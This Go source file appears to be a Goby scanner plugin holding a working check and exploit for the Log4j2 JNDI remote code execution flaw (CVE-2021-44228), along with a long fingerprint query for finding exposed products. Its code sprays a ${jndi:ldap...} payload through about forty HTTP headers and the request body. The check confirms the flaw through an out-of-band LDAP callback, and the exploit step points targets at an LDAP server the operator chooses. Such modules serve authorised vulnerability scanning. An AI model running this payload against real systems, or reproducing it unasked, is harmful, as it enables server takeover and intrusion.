package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Log4j2 HTTP Header remote code execution vulnerability (CVE-2021-44228)",
    "Description": "<p>Apache Log4j2 is a Java-based logging tool. This tool rewrites the Log4j framework and introduces a lot of rich features. This logging framework is widely used in business system development to record log information.</p><p>Apache Log4j 2.x &lt; 2.16.0-rc1 has a jndi injection vulnerability. In most cases, developers may log error messages caused by user input. An attacker can exploit this feature to construct a special data request packet through this vulnerability, ultimately triggering remote code execution.</p>",
    "Product": "Log4j2",
    "Homepage": "https://logging.apache.org/log4j/2.x/",
    "DisclosureDate": "2021-12-10",
    "PostTime": "2023-11-27",
    "Author": "keeeee",
    "FofaQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")) || (header=\"mapreduce\" || body=\"an HTTP request to a Hadoop IPC port\" || banner=\"Name: mapreduce\") || (title==\"SkyWalking\") || (body=\"</i> Shiro</li>\" || header=\"shiro-cas\" || banner=\"shiro-cas\" || header=\"rememberme=deleteMe\" || title=\"Apache Shiro Quickstart\") || (title=\"Powered by JEECMS\") || (((body=\"jeesite.css\" || body=\"jeesite.js\") && body=\"jeesite.com\") || header=\"Set-Cookie: jeesite.session.id=\" || banner=\"Set-Cookie: jeesite.session.id=\") || (header=\" Basic realm=\\\"dubbo\\\"\" || banner=\"Basic realm=\\\"dubbo\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || protocol=\"apache-dubbo\") || (title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\") || (body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\") || (body=\"<li><i class=\\\"fa fa-arrow-circle-o-right m-r-xs\\\"></i> Mybatis</li>\" || (header=\"X-Application-Context\" && header=\"include-mybatis:\") || (banner=\"X-Application-Context\" && banner=\"include-mybatis:\")) || (((header=\"Server: Netty@SpringBoot\" || body=\"Whitelabel Error Page\") && body!=\"couchdb\")) || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (cert=\"Organizational Unit: Apache OFBiz\") || ((header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")) || (title=\"RabbitMQ Management\" || banner=\"server:RabbitMQ\") || (header=\"testBanCookie\" || banner=\"testBanCookie\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\")) || (title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")) || (body=\"content=\\\"Weaver E-mobile\\\"\" || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\")) || (body=\"szFeatures\" && body=\"redirectUrl\") || (title=\"用友新世纪\" && body!=\"couchdb\") || (title=\"用友GRP-U8\") || ((body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")) || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\") || (banner=\"/Jeewms/\" && banner=\"Location\") || (title=\"Hue - Welcome to Hue\" || body=\"id=\\\"jHueNotify\") || (body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\") || (body=\"<b>HttpFs service</b\") || (title=\"E-Business Suite Home Page Redirect\") || ((header=\"Server: Splunkd\" && body!=\"Server: couchdb\" && header!=\"drupal\") || (banner=\"Server: Splunkd\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"Splunk.util.normalizeBoolean\" && body!=\"Server: couchdb\" && header!=\"drupal\")) || (title=\"ID_Converter_Welcome\") || (title=\"Storm UI\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || (title==\"Apache Druid\") || (header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || body=\"<h1>Whitelabel Error Page</h1>\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\") || ((banner=\"JavaMelody\" && banner=\"X-Application-Context\") || (header=\"JavaMelody\" && header=\"X-Application-Context\")) || (header=\"/opennms/login.jsp\" || banner=\"/opennms/login.jsp\" || body=\"OpenNMS? is a registered trademark of\" || title=\"opennms web console\" || body=\"/opennms/index.jsp\") || (cert=\"Apache Unomi\") || ((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\")) || ((header=\"application/json\" && body=\"build_hash\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\") || (((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")) || (body=\"background: transparent url(images/login_logo.gif) no-repeat\" || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\") || (((server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\") || (title=\"Oracle BI Publisher Enterprise\") || (title=\"vSphere Web Client\") || (((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\")) || (body=\"sheight*window.screen.deviceYDPI\") || (body=\"CAS &#8211; Central Authentication Service\") || (cert=\"BMC Control-M Root CA\" || title=\"Control-M Welcome Page\") || (banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (body=\"css/ubnt-icon\" || (body=\"/static/js/uv3.f52e5bd5bc905aef1f095e4e2c1299b3c2bae675.min.js\" && body=\"NVR\") || (cert=\"CommonName: UniFi-Video Controller\" && cert=\"Organizational Unit: R&D\")) || (body=\"j_spring_security_check\" && body=\"MobileIron\") || (title==\"CloudCenter Suite\" || (cert=\"CommonName: ccs.cisco.com\" && cert=\"Organization: Cisco Systems, Inc.\")) || (title=\"UniFi Network\") || (title=\"VMware HCX\" || (cert=\"CommonName: hcx.local\" && cert=\"Organization: VMware\") || (banner=\"/hybridity/ui/hcx-client/index.html\" && banner=\"Location\")) || (title=\"VMware Horizon\" || body=\"href='https://www.vmware.com/go/viewclients'\" || body=\"alt=\\\"VMware Horizon\\\">\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"vSphere Web Client\") || (title=\"vRealize Operations Tenant App\") || (cert=\"codebuild\" && cert=\"Organization: Amazon\") || (banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE? Assist\") || (title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\")) || (title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\") || ((body=\"content=\\\"OpenCms\" || body=\"Powered by OpenCms\") && body!=\"Couchdb\") || (body=\"section-Main-WelcomeToApacheJSPWiki\" || (body=\"/scripts/jspwiki-common.js\" && body=\"jspwiki_print.css\")) || (body=\"<base href=\\\"/zipkin/\\\">\" || (banner=\"location: /zipkin/\" && banner=\"Armeria\") || (banner=\"Location: ./zipkin/\" && banner=\"Content-Length: 0\")) || (cert=\"CodePipeline\" && cert=\"Organization: Amazon\") || (title=\"vRealize Operations Manager\" || banner=\"VMware vRealize Operations\") || (header=\"Server: VMware Horizon DaaS\" || title=\"VMware Horizon DaaS\" || banner=\"Server: VMware Horizon DaaS\" || (cert=\"Organization: VMware\" && cert=\"CommonName: DaaS\")) || (cert=\"quicksight\" && cert=\"Organization: Amazon\") || (cert=\"Apache Unomi\" || (title=\"Apache Unomi Welcome Page\" && body=\"Logo Apache Unomi\")) || (title=\"Index - Elasticsearch Engineer\") || (title==\"VMware Carbon Black EDR\" && body=\"versionNumber\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"TamronOS IPTV系统\") || (cert=\"greengrass\" && cert=\"Organization: Amazon\") || (title==\"Tanzu Observability\") || (title=\"vRealize Log Insight\" || banner=\"VMware vRealize Log Insight\") || ((banner=\"/core/api/Console/Session\" && banner=\"Location\") || (header=\"/core/api/Console/Session\" && header=\"Location\") || (cert=\"CommonName: openmanage1\" && cert=\"Organization: Dell Inc.\") || (body=\"url: '/core/api/Console/Configuration'\" && body=\"/topic/messages\")) || header=\"JSESSIONID\"|| banner=\"JSESSIONID\"",
    "GobyQuery": "(title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")) || (header=\"mapreduce\" || body=\"an HTTP request to a Hadoop IPC port\" || banner=\"Name: mapreduce\") || (title==\"SkyWalking\") || (body=\"</i> Shiro</li>\" || header=\"shiro-cas\" || banner=\"shiro-cas\" || header=\"rememberme=deleteMe\" || title=\"Apache Shiro Quickstart\") || (title=\"Powered by JEECMS\") || (((body=\"jeesite.css\" || body=\"jeesite.js\") && body=\"jeesite.com\") || header=\"Set-Cookie: jeesite.session.id=\" || banner=\"Set-Cookie: jeesite.session.id=\") || (header=\" Basic realm=\\\"dubbo\\\"\" || banner=\"Basic realm=\\\"dubbo\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || protocol=\"apache-dubbo\") || (title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\") || (body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\") || (body=\"<li><i class=\\\"fa fa-arrow-circle-o-right m-r-xs\\\"></i> Mybatis</li>\" || (header=\"X-Application-Context\" && header=\"include-mybatis:\") || (banner=\"X-Application-Context\" && banner=\"include-mybatis:\")) || (((header=\"Server: Netty@SpringBoot\" || body=\"Whitelabel Error Page\") && body!=\"couchdb\")) || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (cert=\"Organizational Unit: Apache OFBiz\") || ((header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")) || (title=\"RabbitMQ Management\" || banner=\"server:RabbitMQ\") || (header=\"testBanCookie\" || banner=\"testBanCookie\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\")) || (title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")) || (body=\"content=\\\"Weaver E-mobile\\\"\" || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\")) || (body=\"szFeatures\" && body=\"redirectUrl\") || (title=\"用友新世纪\" && body!=\"couchdb\") || (title=\"用友GRP-U8\") || ((body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")) || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\") || (banner=\"/Jeewms/\" && banner=\"Location\") || (title=\"Hue - Welcome to Hue\" || body=\"id=\\\"jHueNotify\") || (body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\") || (body=\"<b>HttpFs service</b\") || (title=\"E-Business Suite Home Page Redirect\") || ((header=\"Server: Splunkd\" && body!=\"Server: couchdb\" && header!=\"drupal\") || (banner=\"Server: Splunkd\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"Splunk.util.normalizeBoolean\" && body!=\"Server: couchdb\" && header!=\"drupal\")) || (title=\"ID_Converter_Welcome\") || (title=\"Storm UI\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || (title==\"Apache Druid\") || (header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || body=\"<h1>Whitelabel Error Page</h1>\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\") || ((banner=\"JavaMelody\" && banner=\"X-Application-Context\") || (header=\"JavaMelody\" && header=\"X-Application-Context\")) || (header=\"/opennms/login.jsp\" || banner=\"/opennms/login.jsp\" || body=\"OpenNMS? is a registered trademark of\" || title=\"opennms web console\" || body=\"/opennms/index.jsp\") || (cert=\"Apache Unomi\") || ((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\")) || ((header=\"application/json\" && body=\"build_hash\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\") || (((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")) || (body=\"background: transparent url(images/login_logo.gif) no-repeat\" || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\") || (((server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\") || (title=\"Oracle BI Publisher Enterprise\") || (title=\"vSphere Web Client\") || (((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\")) || (body=\"sheight*window.screen.deviceYDPI\") || (body=\"CAS &#8211; Central Authentication Service\") || (cert=\"BMC Control-M Root CA\" || title=\"Control-M Welcome Page\") || (banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (body=\"css/ubnt-icon\" || (body=\"/static/js/uv3.f52e5bd5bc905aef1f095e4e2c1299b3c2bae675.min.js\" && body=\"NVR\") || (cert=\"CommonName: UniFi-Video Controller\" && cert=\"Organizational Unit: R&D\")) || (body=\"j_spring_security_check\" && body=\"MobileIron\") || (title==\"CloudCenter Suite\" || (cert=\"CommonName: ccs.cisco.com\" && cert=\"Organization: Cisco Systems, Inc.\")) || (title=\"UniFi Network\") || (title=\"VMware HCX\" || (cert=\"CommonName: hcx.local\" && cert=\"Organization: VMware\") || (banner=\"/hybridity/ui/hcx-client/index.html\" && banner=\"Location\")) || (title=\"VMware Horizon\" || body=\"href='https://www.vmware.com/go/viewclients'\" || body=\"alt=\\\"VMware Horizon\\\">\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"vSphere Web Client\") || (title=\"vRealize Operations Tenant App\") || (cert=\"codebuild\" && cert=\"Organization: Amazon\") || (banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE? Assist\") || (title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\")) || (title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\") || ((body=\"content=\\\"OpenCms\" || body=\"Powered by OpenCms\") && body!=\"Couchdb\") || (body=\"section-Main-WelcomeToApacheJSPWiki\" || (body=\"/scripts/jspwiki-common.js\" && body=\"jspwiki_print.css\")) || (body=\"<base href=\\\"/zipkin/\\\">\" || (banner=\"location: /zipkin/\" && banner=\"Armeria\") || (banner=\"Location: ./zipkin/\" && banner=\"Content-Length: 0\")) || (cert=\"CodePipeline\" && cert=\"Organization: Amazon\") || (title=\"vRealize Operations Manager\" || banner=\"VMware vRealize Operations\") || (header=\"Server: VMware Horizon DaaS\" || title=\"VMware Horizon DaaS\" || banner=\"Server: VMware Horizon DaaS\" || (cert=\"Organization: VMware\" && cert=\"CommonName: DaaS\")) || (cert=\"quicksight\" && cert=\"Organization: Amazon\") || (cert=\"Apache Unomi\" || (title=\"Apache Unomi Welcome Page\" && body=\"Logo Apache Unomi\")) || (title=\"Index - Elasticsearch Engineer\") || (title==\"VMware Carbon Black EDR\" && body=\"versionNumber\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"TamronOS IPTV系统\") || (cert=\"greengrass\" && cert=\"Organization: Amazon\") || (title==\"Tanzu Observability\") || (title=\"vRealize Log Insight\" || banner=\"VMware vRealize Log Insight\") || ((banner=\"/core/api/Console/Session\" && banner=\"Location\") || (header=\"/core/api/Console/Session\" && header=\"Location\") || (cert=\"CommonName: openmanage1\" && cert=\"Organization: Dell Inc.\") || (body=\"url: '/core/api/Console/Configuration'\" && body=\"/topic/messages\")) || header=\"JSESSIONID\"|| banner=\"JSESSIONID\"",
    "Level": "3",
    "Impact": "<p>Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "ldap",
            "show": ""
        },
        {
            "name": "ldap",
            "type": "input",
            "value": "ldap://127.0.0.1:1389",
            "show": "attackType=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Apache Log4j2 HTTP Header 远程代码执行漏洞（CVE-2021-44228）",
            "Product": "Log4j2",
            "Description": "<p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。</p><p>Apache Log4j 2.x &lt; 2.16.0-rc1 存在 jndi 注入漏洞。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Log4j2 HTTP Header remote code execution vulnerability (CVE-2021-44228)",
            "Product": "Log4j2",
            "Description": "<p>Apache Log4j2 is a Java-based logging tool. This tool rewrites the Log4j framework and introduces a lot of rich features. This logging framework is widely used in business system development to record log information.</p><p>Apache Log4j 2.x &lt; 2.16.0-rc1 has a jndi injection vulnerability. In most cases, developers may log error messages caused by user input. An attacker can exploit this feature to construct a special data request packet through this vulnerability, ultimately triggering remote code execution.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10884"
}`

	sendPayloadFlag12eadzdee := func(hostInfo *httpclient.FixUrl, ldapAddress string) (*httpclient.HttpResponse, error) {
		payload := fmt.Sprintf("${jndi:%s}", ldapAddress)
		cfg := httpclient.NewGetRequestConfig("/?getData=" + url.QueryEscape(payload))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("X-Api-Version", payload)
		cfg.Header.Store("X-Forwarded-For", payload)
		cfg.Header.Store("If-Modified-Since", payload)
		cfg.Header.Store("User-Agent", payload)
		cfg.Header.Store("Cookie", payload)
		cfg.Header.Store("Refer", payload)
		cfg.Header.Store("Accept-Language", payload)
		cfg.Header.Store("Accept-Encoding", payload)
		cfg.Header.Store("Upgrade-insecure-requests", payload)
		cfg.Header.Store("Accept", payload)
		cfg.Header.Store("upgrade-insecure-requests", payload)
		cfg.Header.Store("Origin", payload)
		cfg.Header.Store("Pragma", payload)
		cfg.Header.Store("X-Requested-With", payload)
		cfg.Header.Store("X-CSRF-Token", payload)
		cfg.Header.Store("Dnt", payload)
		cfg.Header.Store("Content-Length", payload)
		cfg.Header.Store("Access-Control-Request-Method", payload)
		cfg.Header.Store("Access-Control-Request-Method", payload)
		cfg.Header.Store("Warning", payload)
		cfg.Header.Store("Authorization", payload)
		cfg.Header.Store("TE", payload)
		cfg.Header.Store("Accept-Charset", payload)
		cfg.Header.Store("Accept-Datetime", payload)
		cfg.Header.Store("Date", payload)
		cfg.Header.Store("Forwarded", payload)
		cfg.Header.Store("From", payload)
		cfg.Header.Store("Max-Forwards", payload)
		cfg.Header.Store("Proxy-Authorization", payload)
		cfg.Header.Store("Range", payload)
		cfg.Header.Store("Content-Disposition", payload)
		cfg.Header.Store("Content-Encoding", payload)
		cfg.Header.Store("X-Amz-Target", payload)
		cfg.Header.Store("X-Amz-Date", payload)
		cfg.Header.Store("Username", payload)
		cfg.Header.Store("IP", payload)
		cfg.Header.Store("IPaddress", payload)
		cfg.Header.Store("Hostname", payload)
		cfg.Header.Store("X-CSRFToken", payload)
		cfg.Header.Store("X-XSRF-TOKEN", payload)
		cfg.Header.Store("X-ProxyUser-Ip", payload)
		cfg.Data = "postData=" + url.QueryEscape(payload)
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			ldapAddr, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
			_, err := sendPayloadFlag12eadzdee(hostInfo, ldapAddr)
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "ldap" {
				_, err := sendPayloadFlag12eadzdee(expResult.HostInfo, goutils.B2S(ss.Params["ldap"]))
				if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Success = true
					expResult.Output = "请自行检查LDAP服务日志"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			return expResult
		},
	))
}
